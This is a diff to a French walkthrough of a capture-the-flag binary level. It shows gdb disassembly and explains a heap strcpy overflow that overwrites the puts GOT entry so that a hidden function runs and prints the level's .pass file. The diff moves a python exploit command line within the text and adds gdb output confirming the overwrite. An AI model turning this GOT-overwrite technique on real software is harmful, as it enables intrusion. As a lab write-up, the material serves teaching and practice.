@@ -25,6 +25,7 @@ On lance le binaire et on se rend compte qu'il écrit sur l'entrée standard "~~
 On peut voir un looooooong <main>. Il y'a aussi une fonction <m> laissé-pour-compte qui n'est pas appellée dans le <main>, mais qui est intéressante.
 Étudions donc ces éléments:
 ___________________________________________________________________________________________________________________________________________________________________
+								|
 (gdb) disas main						|
 Dump of assembler code for function main:			|	Accrochez vous car ce walkthrough va être chargé !
    0x08048521 <+0>:	push   %ebp				|	Nous avonc tentez de décomposer de facon logique pour faciliter la compréhension.
@@ -97,10 +98,12 @@ Dump of assembler code for function main:			|	Accrochez vous car ce walkthrough 
 			End of assembler dump.
 			
 			Nous devons donc écrire 0x80484f4 dans 0x8049928. Or nous savons que nous pouvons écrire dans une adresse de notre choix.
-			Avec ce qui a été mis en évidence dans la section "STRCPY PATTERN - OVERWRITE ATTEMP" plus haut nous allons procéder
+			Avec ce qui a été mis en évidence dans la section plus haut "STRCPY PATTERN - OVERWRITE ATTEMP" nous allons procéder
 			de la facon suivante :
 			- AV[1] = OFFSET DE 20 + "\x28\x99\x04\x08"
 			- AV[2] = "\xf4\x84\x04\x08" -> 0x8049928
+			
+			Nous pouvons monter l'exploit suivante : $(python -c 'print( 20 * "A" + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')
 			
 			(gdb) x/60wx 0x804a000
 			0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
@@ -109,26 +112,27 @@ Dump of assembler code for function main:			|	Accrochez vous car ce walkthrough 
 			0x804a030:	0x00000000	0x00000011	0x00000000	0x00000000
 			0x804a040:	0x00000000	0x00020fc1	
 			
-			Nous pouvons monter l'exploit suivante : $(python -c 'print( 20 * "A" + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')
+			(gdb) x 0x08049928
+			0x8049928 <puts@got.plt>:	0x080484f4
 			
 			Maintenant que nous n'appelons plus puts() mais la fonction <m>, Mais que fait elle ?
-									---------------------------------------------------------------------------------------------
-									(gdb) disas m
-									Dump of assembler code for function m:
-   										0x080484f4 <+0>:	push   %ebp			Cette fonction est simple
-   										0x080484f5 <+1>:	mov    %esp,%ebp		elle donne comme argument
-  									 	0x080484f7 <+3>:	sub    $0x18,%esp		à printf :
-   										0x080484fa <+6>:	movl   $0x0,(%esp)		- "%s - %d"
-   										0x08048501 <+13>:	call   0x80483d0 <time@plt>	- %s : ma variable <c> qui
-   										0x08048506 <+18>:	mov    $0x80486e0,%edx		  contient donc le fichier
-   										0x0804850b <+23>:	mov    %eax,0x8(%esp)		  .pass
-   										0x0804850f <+27>:	movl   $0x8049960,0x4(%esp)     - %d : le retour de time()
- 										0x08048517 <+35>:	mov    %edx,(%esp)		
-   										0x0804851a <+38>:	call   0x80483b0 <printf@plt>	Cela devrait donc nous 
-  			 							0x0804851f <+43>:	leave				afficher .pass !
-   										0x08048520 <+44>:	ret
-									End of assembler dump.
-									---------------------------------------------------------------------------------------------
+								----------------------------------------------------------------------------------------------------------
+								(gdb) disas m
+								Dump of assembler code for function m:
+   									0x080484f4 <+0>:	push   %ebp			Cette fonction est simple
+   									0x080484f5 <+1>:	mov    %esp,%ebp		elle donne comme argument
+  								 	0x080484f7 <+3>:	sub    $0x18,%esp		à printf :
+   									0x080484fa <+6>:	movl   $0x0,(%esp)		- "%s - %d"
+   									0x08048501 <+13>:	call   0x80483d0 <time@plt>	- %s : ma variable <c> qui
+   									0x08048506 <+18>:	mov    $0x80486e0,%edx		  contient donc le fichier
+   									0x0804850b <+23>:	mov    %eax,0x8(%esp)		  .pass
+  									0x0804850f <+27>:	movl   $0x8049960,0x4(%esp)     - %d : le retour de time()
+ 									0x08048517 <+35>:	mov    %edx,(%esp)		
+  									0x0804851a <+38>:	call   0x80483b0 <printf@plt>	Cela devrait donc nous 
+  			 						0x0804851f <+43>:	leave				afficher .pass !
+   									0x08048520 <+44>:	ret
+								End of assembler dump.
+								---------------------------------------------------------------------------------------------------------
 									
 			---------------------------------------------------------------------------------------------------------------------------------------------			
    0x080485fc <+219>:	mov    $0x0,%eax
